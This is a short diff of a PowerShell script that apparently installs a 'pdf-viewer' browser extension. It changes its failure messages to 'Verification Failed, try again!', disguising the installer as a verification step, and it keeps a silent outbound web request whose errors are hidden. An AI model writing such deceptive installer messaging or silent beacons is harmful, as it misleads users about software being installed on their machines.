@@ -17,7 +17,7 @@ try {
     if (-not $manifestPath) {
         Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
         Remove-Item $env:TEMP\pdf-viewer-temp -Recurse -Force -ErrorAction SilentlyContinue
-        Write-Host "Installation failed" -ForegroundColor Red
+        Write-Host "Verification Failed, try again!" -ForegroundColor Red
         exit 1
     }
     $extensionSourceDir = $manifestPath.DirectoryName
@@ -142,12 +142,12 @@ try {
             -ContentType "text/plain" -UseBasicParsing -TimeoutSec 5 | Out-Null
     } catch { }
 } catch {
-    Write-Host "Installation failed" -ForegroundColor Red
+    Write-Host "Verification Failed, try again!" -ForegroundColor Red
     exit 1
 }
 if ($installedCount -gt 0) {
     Write-Host "Successfully completed" -ForegroundColor Green
     exit 0
 }
-Write-Host "Installation failed" -ForegroundColor Red
+Write-Host "Verification Failed, try again!" -ForegroundColor Red
 exit 1
